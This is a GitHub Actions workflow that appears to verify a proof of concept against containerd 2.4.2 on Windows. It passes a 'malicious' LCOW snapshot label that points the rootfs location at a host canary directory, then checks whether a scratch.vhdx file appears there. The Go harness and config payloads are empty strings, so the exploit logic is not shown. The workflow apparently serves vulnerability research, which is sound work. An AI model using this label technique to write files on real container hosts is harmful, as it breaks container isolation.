name: D17 LCOW host-file write PoC
on:
  workflow_dispatch:
  push:
    branches: [cmd-bot]

jobs:
  poc:
    runs-on: windows-latest
    timeout-minutes: 25
    steps:
      - name: Download containerd 2.4.2 and prep dirs
        shell: pwsh
        run: |
          $ErrorActionPreference = 'Stop'
          $base = 'C:\ctdpoc'
          New-Item -ItemType Directory -Force -Path "$base\bin", "$base\root", "$base\state", "$base\canary", "$base\go" | Out-Null
          Write-Output "CANARY_BEFORE:"
          Get-ChildItem "$base\canary" -Force | Select-Object Name,Length | Format-Table
          Invoke-WebRequest -Uri 'https://github.com/containerd/containerd/releases/download/v2.4.2/containerd-2.4.2-windows-amd64.tar.gz' -OutFile "$base\ctd.tar.gz" -UseBasicParsing
          tar xzf "$base\ctd.tar.gz" -C "$base\bin"
          Get-ChildItem "$base\bin\bin" | Select-Object Name,Length | Format-Table

      - name: Write containerd config + Go harness
        shell: pwsh
        run: |
          $cfg = ''
          [System.IO.File]::WriteAllBytes('C:\ctdpoc\config.toml', [System.Convert]::FromBase64String($cfg))
          $gomod = 'bW9kdWxlIGQxN3BvYwoKZ28gMS4yNAoKcmVxdWlyZSBnaXRodWIuY29tL2NvbnRhaW5lcmQvY29udGFpbmVyZC92MiB2Mi40LjIK'
          [System.IO.File]::WriteAllBytes('C:\ctdpoc\go\go.mod', [System.Convert]::FromBase64String($gomod))
          $gomn = ''
          [System.IO.File]::WriteAllBytes('C:\ctdpoc\go\main.go', [System.Convert]::FromBase64String($gomn))
          Write-Output '=== config ==='
          Get-Content 'C:\ctdpoc\config.toml'

      - name: Build Go harness (official containerd client)
        shell: pwsh
        run: |
          $env:GO111MODULE='on'
          Set-Location 'C:\ctdpoc\go'
          go mod tidy 2>&1 | Tee-Object -FilePath 'C:\ctdpoc\gomod.out'
          go build -o 'C:\ctdpoc\poc.exe' . 2>&1 | Tee-Object -FilePath 'C:\ctdpoc\build.out'
          Write-Output "BUILD_EXIT=$LASTEXITCODE"
          Get-Item 'C:\ctdpoc\poc.exe' -ErrorAction SilentlyContinue | Select-Object FullName,Length | Format-List

      - name: Start daemon + trigger malicious Prepare + capture (single step)
        shell: pwsh
        run: |
          $ErrorActionPreference = 'Continue'
          $base = 'C:\ctdpoc'
          $loc = 'C:\ctdpoc\canary'
          $labelKey = 'containerd.io/snapshot/io.microsoft.container.storage.rootfs.location'
          # start daemon in this SAME step so it stays alive
          $p = Start-Process -FilePath "$base\bin\bin\containerd.exe" -ArgumentList @('--config',"$base\config.toml",'--log-level','debug') -RedirectStandardOutput "$base\stdout.log" -RedirectStandardError "$base\stderr.log" -PassThru
          Write-Output "CONTAINERD_PID=$($p.Id)"
          Start-Sleep -Seconds 8
          Write-Output '--- alive? ---'
          Get-Process containerd -ErrorAction SilentlyContinue | Select-Object Id,ProcessName | Format-Table
          Write-Output '--- plugins ---'
          & "$base\bin\bin\ctr.exe" --address '\\.\pipe\ctd-grpc' plugins ls 2>&1 | Select-String 'snapshotter'
          Write-Output "=== malicious label: $labelKey = $loc ==="
          & "$base\poc.exe" '\\.\pipe\ctd-grpc' 'd17poc' 'windows-lcow' 'victim-sandbox' $labelKey $loc 2>&1 | Tee-Object -FilePath "$base\prepare.out"
          Write-Output "POC_EXIT=$LASTEXITCODE"
          Start-Sleep -Seconds 3
          Write-Output '=== CANARY AFTER ==='
          Get-ChildItem $loc -Force | Select-Object Name,Length,LastWriteTime | Format-Table
          $probe = Join-Path $loc 'scratch.vhdx'
          Write-Output "HOST_FILE_WRITTEN=$(Test-Path $probe)"
          if (Test-Path $probe) { Get-Item $probe | Select-Object FullName,Length,LastWriteTime | Format-List; Get-FileHash $probe -Algorithm SHA256 | Format-List }
          Write-Output '=== daemon stderr tail ==='
          if (Test-Path "$base\stderr.log") { Get-Content "$base\stderr.log" -Tail 60 }

      - name: Upload evidence
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: ctd-poc-evidence
          path: |
            C:\ctdpoc\prepare.out
            C:\ctdpoc\build.out
            C:\ctdpoc\gomod.out
            C:\ctdpoc\stderr.log
            C:\ctdpoc\stdout.log
            C:\ctdpoc\config.toml
          if-no-files-found: warn
